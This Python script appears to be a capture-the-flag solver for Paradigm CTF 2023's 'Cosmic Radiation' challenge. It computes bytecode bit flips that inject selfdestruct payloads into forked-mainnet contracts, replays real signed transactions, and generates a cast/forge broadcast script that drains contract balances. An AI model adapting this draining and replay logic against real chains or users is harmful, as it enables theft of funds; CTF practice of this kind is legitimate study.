import os
import pickle
import time
from dataclasses import dataclass
from pathlib import Path

import requests
from erever.assemble import assemble
from erever.context import Context
from erever.disassemble import DisassembleResult, disassemble
from eth_account._utils.legacy_transactions import encode_transaction, serializable_unsigned_transaction_from_dict
from eth_account._utils.typed_transactions import TypedTransaction
from pwn import remote
from tqdm import tqdm
from web3 import Web3

BASE_DIR = Path(__file__).resolve().parent

STEP = 7

MAX_N_BITFLIP = 10000 if STEP >= 2 else 1
MAX_N_REPLAY = 1000 if STEP >= 7 else 0
MAX_N_CONTRACTS_TO_ATTACK_ONCE = 500
MAX_N_REPLAY_INTERMEDIATE_TXS = 5
MAX_STEPS_IN_SIMULATION = 500 if STEP >= 3 else 1
USE_PROXY_STRATEGY = True if STEP >= 6 else False
USE_CALLER = True if STEP >= 4 else False
USE_CALLDATA4 = True if STEP >= 5 else False

# anvil --fork-url $RPC_MAINNET --fork-block-number 18437825
# This is NOT the RPC endpoint of the challenge server.
RPC_URL = "http://127.0.0.1:8545"
BLOCK_NUMBER = 18437825

RPC_MAINNET_URL = os.getenv("RPC_MAINNET")
assert RPC_MAINNET_URL is not None
ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY")
assert ETHERSCAN_API_KEY is not None

DEBUG_PRINT = False

LOCAL = True
CHALLENGE_HOST: str = "localhost" if LOCAL else "cosmic-radiation.challenges.paradigm.xyz"
CHALLENGE_PORT: str = "7777" if LOCAL else "1337"


@dataclass
class Contract:
    addr: str
    balance: int
    code: bytes


@dataclass
class Strategy:
    addr: str
    bitflip_addr: str
    bitflip: str
    context_strategy: dict
    estimated_score: int


class Web3Cache:
    """
    Cache for RPC requests:
    """

    CACHE_FILE: Path = BASE_DIR / "web3-cache.pickle"

    w3: Web3
    block_number: int
    cache: dict

    def __init__(self, rpc_url=RPC_URL, block_number=BLOCK_NUMBER):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.block_number = block_number
        self.cache = pickle.load(self.CACHE_FILE.open("rb")) if self.CACHE_FILE.exists() else {}

    def get_balance(self, addr):
        key = "get_balance:" + addr
        if key in self.cache:
            return self.cache[key]
        balance = self.w3.eth.get_balance(addr)
        self.cache[key] = balance
        return balance

    def get_code(self, addr):
        key = "get_code:" + addr
        if key in self.cache:
            return self.cache[key]
        code = self.w3.eth.get_code(addr)
        self.cache[key] = code
        return code

    def get_transaction_count(self, addr):
        key = "get_transaction_count:" + addr
        if key in self.cache:
            return self.cache[key]
        nonce = self.w3.eth.get_transaction_count(addr)
        self.cache[key] = nonce
        return nonce

    def get_transaction(self, tx_hash):
        key = "get_transaction:" + tx_hash
        if key in self.cache:
            return self.cache[key]
        tx = self.w3.eth.get_transaction(tx_hash)
        self.cache[key] = tx
        return tx

    def save(self):
        pickle.dump(self.cache, self.CACHE_FILE.open("wb"))


w3c = Web3Cache()


class DisassembleCache:
    CACHE_FILE: Path = BASE_DIR / "disassemble-cache.pickle"

    cache: dict
    updated: bool = False

    def __init__(self):
        print("loading disassemble cache...")
        self.cache = pickle.load(self.CACHE_FILE.open("rb")) if self.CACHE_FILE.exists() else {}
        print("done")

    def disas(self, context_strategy: dict, silent, trace, max_steps, return_trace_logs) -> DisassembleResult:
        key = str(context_strategy) + str(silent) + str(trace) + str(max_steps) + str(return_trace_logs)
        if key in self.cache:
            return self.cache[key]
        result = disassemble(context=Context.from_dict(context_strategy), silent=silent, trace=trace, max_steps=max_steps, return_trace_logs=return_trace_logs)
        self.cache[key] = result
        self.updated = True
        return result

    def save(self):
        if not self.updated:
            return
        pickle.dump(self.cache, self.CACHE_FILE.open("wb"))


disassemble_cache = DisassembleCache()


def calculate_corrupted_balance(bitflip: str, balance=None, code=None):
    """
    NOTE: This is NOT working for a proxy contract.
    """
    (addr, *bits) = bitflip.split(":")
    bits = [int(v) for v in bits]

    balance = w3c.get_balance(addr) if balance is None else balance
    if balance == 0:
        raise Exception("invalid target")

    code = bytearray(w3c.get_code(addr)) if code is None else bytearray(code)
    for bit in bits:
        byte_offset = bit // 8
        bit_offset = 7 - bit % 8
        if byte_offset < len(code):
            code[byte_offset] ^= 1 << bit_offset

    total_bits = len(code) * 8
    corrupted_balance = int(balance * (total_bits - len(bits)) / total_bits)
    return corrupted_balance


def generate_bitflip(payload, addr, code, pc):
    assert pc + len(payload) < len(code)
    modified_bits = []
    for i in range(0, len(payload)):
        d = payload[i] ^ code[pc + i]
        for j in range(8):
            if d & (1 << j):
                modified_bits.append(pc * 8 + i * 8 + (7 - j))
    bitflip = f"{addr}:{':'.join([str(b) for b in modified_bits])}"
    return bitflip


def construct_raw_tx(tx: dict):
    tx["data"] = tx["input"]
    del tx["blockHash"], tx["blockNumber"], tx["from"], tx["hash"], tx["input"], tx["transactionIndex"]

    if "type" in tx and tx["type"] != 0:
        del tx["gasPrice"]
        typed_tx = TypedTransaction.from_dict(tx)
        raw_tx = typed_tx.encode()
    else:
        v, r, s = tx["v"], int(tx["r"].hex(), 16), int(tx["s"].hex(), 16)
        del tx["type"], tx["v"], tx["r"], tx["s"]
        legacy_tx = serializable_unsigned_transaction_from_dict(tx)
        raw_tx = encode_transaction(legacy_tx, vrs=(v, r, s))

    return raw_tx


def fetch_successful_txs_by_address_between_blocks(addr, start_block, end_block):
    result = requests.get(
        "https://api.etherscan.io/api",
        params={
            "module": "account",
            "action": "txlist",
            "address": addr,
            "startblock": start_block,
            "endblock": end_block,
            "page": 1,
            "offset": 10,
            "sort": "asc",
            "apikey": ETHERSCAN_API_KEY,
        },
    )
    result_json = result.json()
    assert result_json["status"] == "1"

    txs = result_json["result"]
    successful_txs = []

    for tx in txs:
        if tx["txreceipt_status"] != "1":
            continue
        successful_txs.append(tx)

    return successful_txs


def load_contracts():
    contracts: list[Contract] = []
    contract_addrs = set()
    with open(BASE_DIR / "data/contract-list.csv", "r") as f:
        lines = f.readlines()
        for line in lines:
            addr, balance, code_hex = line.strip().split(",")
            contracts.append(Contract(addr, int(balance), bytes.fromhex(code_hex)))
            contract_addrs.add(addr)
    contracts = contracts[: MAX_N_BITFLIP * 3 // 2 + 1000]

    replay_target_addrs = set()
    replay_earn = {}
    replay_tx_hashes = []

    addr_to_nonce = {}
    loss_by_nonce_mismatch = 0
    loss_by_insufficient_fund = 0
    to_addrs_in_replay_intermediate_txs = set()

    with open(BASE_DIR / "data/100ether-transfer.csv", "r") as f:
        transfer_lines = f.readlines()[1:]
        for line in tqdm(transfer_lines[:MAX_N_REPLAY]):
            # deserialize
            tx_hash, from_addr, to_addr, value, nonce = line.strip().split(",")
            from_addr = Web3.to_checksum_address(from_addr)
            to_addr = Web3.to_checksum_address(to_addr)
            value = int(value)
            nonce = int(nonce)

            from_balance = w3c.get_balance(from_addr)
            to_balance = w3c.get_balance(to_addr)

            if from_balance < value:
                loss_by_insufficient_fund += from_balance // 10**18
                continue

            if to_balance == 0:
                continue

            start_nonce = w3c.get_transaction_count(from_addr) if from_addr not in addr_to_nonce else addr_to_nonce[from_addr]

            if nonce - start_nonce >= MAX_N_REPLAY_INTERMEDIATE_TXS:
                loss_by_nonce_mismatch += value // 10**18
                continue

            tmp_replay_intermediate_tx_hashes = []
            tmp_to_addrs_in_replay_intermediate_txs = set()
            if nonce - start_nonce >= 1:
                END_BLOCK_NUMBER = 18451700
                successful_txs_by_address_between_blocks = fetch_successful_txs_by_address_between_blocks(from_addr, BLOCK_NUMBER, END_BLOCK_NUMBER)
                valid = True
                for tx in successful_txs_by_address_between_blocks:
                    if tx_hash == tx["hash"]:
                        break
                    to_addr_in_replay_intermediate_tx = Web3.to_checksum_address(tx["to"])
                    to_addr_in_replay_intermediate_tx_balance = w3c.get_balance(to_addr_in_replay_intermediate_tx)
                    if to_addr_in_replay_intermediate_tx_balance == 0:
                        valid = False
                        break
                    if w3c.get_code(to_addr_in_replay_intermediate_tx) != b"":
                        tmp_to_addrs_in_replay_intermediate_txs.add(to_addr_in_replay_intermediate_tx)
                    tmp_replay_intermediate_tx_hashes.append(tx["hash"])
                if not valid:
                    continue

            addr_to_nonce[from_addr] = nonce + 1

            replay_target_addrs.add(to_addr)
            replay_earn[to_addr] = replay_earn.get(to_addr, 0) + value

            if to_addr not in contract_addrs:
                contract_addrs.add(to_addr)
                to_code = bytes(w3c.get_code(to_addr))
                contracts.append(Contract(to_addr, to_balance, to_code))

            to_addrs_in_replay_intermediate_txs.update(tmp_to_addrs_in_replay_intermediate_txs)
            replay_tx_hashes.extend(tmp_replay_intermediate_tx_hashes)
            replay_tx_hashes.append(tx_hash)

    print("replay target addrs:", len(replay_target_addrs))
    print(f"{loss_by_nonce_mismatch=}, {loss_by_insufficient_fund=}")
    print(f"total replay earn: {sum(replay_earn.values())//10**18}")

    contracts.sort(key=lambda x: x.balance, reverse=True)

    return contracts, replay_target_addrs, replay_earn, replay_tx_hashes, to_addrs_in_replay_intermediate_txs


def find_optimal_strategies(contracts: list[Contract], replay_target_addrs: set, replay_earn: dict, to_addrs_in_replay_intermediate_txs: set):
    GENERAL_PAYLOADS = (
        [
            assemble("ORIGIN SELFDESTRUCT"),
            assemble("CALLER SELFDESTRUCT"),
        ]
        if USE_CALLER
        else [
            assemble("ORIGIN SELFDESTRUCT"),
        ]
    )
    REPLAY_ATTACK_PAYLOAD = assemble("CALLVALUE PUSH1 0x06 JUMPI ORIGIN SELFDESTRUCT JUMPDEST STOP")
    REPLAY_ATTACK_INTERMEDIATE_PAYLOAD = assemble("STOP")

    strategies: list[Strategy] = []

    for contract in tqdm(contracts):
        (addr, balance, code) = (contract.addr, contract.balance, contract.code)

        CONTEXT_STRATEGIES = (
            [
                {"bytecode": code.hex(), "number": BLOCK_NUMBER, "address": int(addr, 16), "gas": 100000, "rpc_url": RPC_URL, "timestamp": 1698364865},
                {"bytecode": code.hex(), "number": BLOCK_NUMBER, "address": int(addr, 16), "gas": 100000, "rpc_url": RPC_URL, "timestamp": 1698364865, "calldata": "0x11223344"},
            ]
            if USE_CALLDATA4
            else [
                {"bytecode": code.hex(), "number": BLOCK_NUMBER, "address": int(addr, 16), "gas": 100000, "rpc_url": RPC_URL, "timestamp": 1698364865},
            ]
        )

        best_bitflip_addr = None
        best_bitflip = None
        best_context_strategy = None
        best_score = 0
        use_replay_attack = True

        if addr in replay_target_addrs:
            assert len(code) >= len(REPLAY_ATTACK_PAYLOAD)

            best_bitflip_addr = addr
            best_bitflip = generate_bitflip(REPLAY_ATTACK_PAYLOAD, addr, code, 0)
            best_score = calculate_corrupted_balance(best_bitflip, balance + replay_earn[addr], code)
            best_context_strategy = CONTEXT_STRATEGIES[0]

        for context_strategy in CONTEXT_STRATEGIES:
            result_trace: DisassembleResult = disassemble_cache.disas(context_strategy=context_strategy, silent=True, trace=True, max_steps=MAX_STEPS_IN_SIMULATION, return_trace_logs=True)

            END_OPCODES = [
                "STOP",
                "RETURN",
                "REVERT",
                "INVALID",
                "SELFDESTRUCT",
                "DELEGATECALL",
                "STATICCALL",
                "CALLCODE",
                "CALL",
                "CREATE",
                "CREATE2",
            ]

            use_proxy_strategy = False
            if USE_PROXY_STRATEGY:
                for trace_log in result_trace.trace_logs:
                    if DEBUG_PRINT:
                        print(trace_log.stack_before_execution.to_string())
                        print(trace_log.mnemonic_raw)
                    if trace_log.mnemonic_raw in ["DELEGATECALL", "CALLCODE"]:
                        impl_addr = Web3.to_checksum_address("0x" + hex(trace_log.stack_before_execution[-2])[2:].zfill(40))
                        impl_balance = w3c.get_balance(impl_addr)
                        impl_code = w3c.get_code(impl_addr)
                        if impl_balance > 0 and len(impl_code) >= 2:
                            use_proxy_strategy = True

                    if trace_log.mnemonic_raw in END_OPCODES:
                        break

            if use_proxy_strategy:
                use_replay_attack = False
                bitflip = generate_bitflip(GENERAL_PAYLOADS[0], impl_addr, impl_code, 0)
                best_score = balance
                best_bitflip_addr = impl_addr
                best_bitflip = bitflip
                best_context_strategy = context_strategy
            else:
                for pc, mnemonic, _push_v in result_trace.disassemble_code:
                    if mnemonic == "JUMPDEST":
                        continue
                    for payload in GENERAL_PAYLOADS:
                        if pc + len(payload) >= len(code):
                            continue
                        bitflip = generate_bitflip(payload, addr, code, pc)
                        tmp_score = calculate_corrupted_balance(bitflip, balance, code)
                        if tmp_score > best_score:
                            best_score = tmp_score
                            best_bitflip_addr = addr
                            best_bitflip = bitflip
                            best_context_strategy = context_strategy
                            use_replay_attack = False

                    if mnemonic in END_OPCODES:
                        break
                    if "?" in mnemonic:
                        break

        if DEBUG_PRINT:
            print(best_bitflip.count(":"), (balance - best_score) // 10**18)

        strategies.append(Strategy(addr, best_bitflip_addr, best_bitflip, best_context_strategy, best_score))

        if addr in replay_target_addrs and not use_replay_attack:
            replay_target_addrs.remove(addr)

        if addr in to_addrs_in_replay_intermediate_txs:
            to_addrs_in_replay_intermediate_txs.remove(addr)

    strategies.sort(key=lambda x: x.estimated_score, reverse=True)

    replay_intermediate_strategies = []
    for addr in to_addrs_in_replay_intermediate_txs:
        bitflip = generate_bitflip(REPLAY_ATTACK_INTERMEDIATE_PAYLOAD, addr, w3c.get_code(addr), 0)
        replay_intermediate_strategies.append(Strategy(addr, addr, bitflip, CONTEXT_STRATEGIES[0], 0))
    strategies = replay_intermediate_strategies + strategies

    count = 0
    addr_to_bitflip = {}
    new_strategies = []
    for strategy in strategies:
        if count >= MAX_N_BITFLIP:
            break
        new_strategies.append(strategy)
        if strategy.bitflip_addr in addr_to_bitflip:
            assert addr_to_bitflip[strategy.bitflip_addr] == strategy.bitflip
            continue
        addr_to_bitflip[strategy.bitflip_addr] = strategy.bitflip
        count += 1
    strategies = new_strategies

    total_estimated_score = 0
    for strategy in strategies:
        total_estimated_score += strategy.estimated_score
    total_estimated_score += 999 * 10**18

    print(f"{total_estimated_score//10**18=}")
    print(f"{len(strategies)=}")

    return strategies, total_estimated_score


def setup_challenge_server(strategies: list[Strategy]):
    r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
    r.recvuntil(b"ticket? ")
    r.sendline(b"DUMMY TICKET")
    r.recvuntil(b"action? ")
    r.sendline(b"2")
    r.close()

    time.sleep(1)

    r = remote(CHALLENGE_HOST, CHALLENGE_PORT, level="debug")
    r.recvuntil(b"ticket? ")
    r.sendline(b"DUMMY TICKET")
    r.recvuntil(b"action? ")
    r.sendline(b"1")

    r.recvuntil(b"bitflip? ")

    # NOTE: the below code can be changed to use batch sending
    addr_to_bitflip = {}
    for strategy in strategies:
        text = strategy.bitflip + "\n"
        if strategy.bitflip_addr in addr_to_bitflip:
            assert addr_to_bitflip[strategy.bitflip_addr] == strategy.bitflip
            continue
        addr_to_bitflip[strategy.bitflip_addr] = strategy.bitflip
        r.sendline(text.encode())
        r.recv()

    r.sendline(b"")
    r.recvuntil(b" - ")
    rpc_endpoint = r.recvline().strip().decode()
    r.recvuntil(b"private key:")
    private_key = r.recvline().strip().decode()
    r.recvuntil(b"challenge contract:")
    challenge_addr = r.recvline().strip().decode()
    r.close()

    return rpc_endpoint, private_key, challenge_addr


def generate_broadcast_script(replay_tx_hashes: list, replay_target_addrs, strategies: list[Strategy], total_estimated_score, rpc_endpoint, private_key, challenge_addr):
    with open(BASE_DIR / "broadcast.sh", "w") as f:
        commands = [
            # "set -ex",
            f"export FOUNDRY_ETH_RPC_URL={rpc_endpoint}",
            f"export PRIVATE_KEY={private_key}",
            "player_address=$(cast wallet address --private-key $PRIVATE_KEY)",
            'exploit_address=$(forge create src/ParadigmCTF2023/CosmicRadiation/Exploit.s.sol:SelfDestruct --private-key $PRIVATE_KEY --legacy --json | jq ".deployedTo" -r)',
            # reduce gas price
            "cast send $(cast --address-zero) --private-key $PRIVATE_KEY",
        ]

        w3 = Web3(Web3.HTTPProvider(RPC_MAINNET_URL))
        for tx_hash in replay_tx_hashes:
            tx = dict(w3.eth.get_transaction(tx_hash))
            if tx["to"] not in replay_target_addrs:
                continue
            raw_tx = construct_raw_tx(tx)

            commands.append(f"cast publish {raw_tx.hex()} --async")

        commands.append('echo "exploit contract: $(cast balance $exploit_address --ether)"')
        commands.append('echo "          origin: $(cast balance $player_address --ether)"')

        for i in range(0, len(strategies), MAX_N_CONTRACTS_TO_ATTACK_ONCE):
            calldata_to_exploiting_addrs = {}
            for j in range(i, min(i + MAX_N_CONTRACTS_TO_ATTACK_ONCE, len(strategies))):
                context_strategy = strategies[j].context_strategy
                calldata = context_strategy.get("calldata", "0x")
                calldata_to_exploiting_addrs[calldata] = calldata_to_exploiting_addrs.get(calldata, []) + [strategies[j].addr]

            for arg_calldata, arg_exploiting_addr in calldata_to_exploiting_addrs.items():
                exploiting_addrs_text = f'[{",".join(arg_exploiting_addr)}]'

                if arg_calldata != "0x":
                    exploit_command = f'cast send $exploit_address "exploit(bytes,address[])" "{arg_calldata}" "{exploiting_addrs_text}" --private-key $PRIVATE_KEY --legacy --gas-limit 30000000'
                else:
                    exploit_command = f'cast send $exploit_address "exploit(address[])" "{exploiting_addrs_text}" --private-key $PRIVATE_KEY --legacy --gas-limit 30000000'

                commands.append(exploit_command)
                commands.append("sleep 0.5")

            commands.append('echo "exploit contract: $(cast balance $exploit_address --ether)"')
            commands.append('echo "          origin: $(cast balance $player_address --ether)"')
            commands.append("sleep 0.5")

        commands.extend(
            [
                'value=$(python -c "import sys; print(int(sys.argv[1]) - 10 ** 17)" $(cast balance $player_address))',
                f'cast send $exploit_address "destruct(address)" {challenge_addr} --private-key $PRIVATE_KEY --value $value --legacy',
                'echo "          SCORE: ' + f'$(cast balance {challenge_addr} --ether)"',
                'echo "ESTIMATED SCORE: ' + f'{total_estimated_score//10**18}"',
            ]
        )

        f.write("\n".join(commands))


def main():
    contracts, replay_target_addrs, replay_earn, replay_tx_hashes, to_addrs_in_replay_intermediate_txs = load_contracts()

    strategies, total_estimated_score = find_optimal_strategies(contracts, replay_target_addrs, replay_earn, to_addrs_in_replay_intermediate_txs)

    disassemble_cache.save()

    rpc_endpoint, private_key, challenge_addr = setup_challenge_server(strategies)

    generate_broadcast_script(replay_tx_hashes, replay_target_addrs, strategies, total_estimated_score, rpc_endpoint, private_key, challenge_addr)

    w3c.save()


if __name__ == "__main__":
    main()
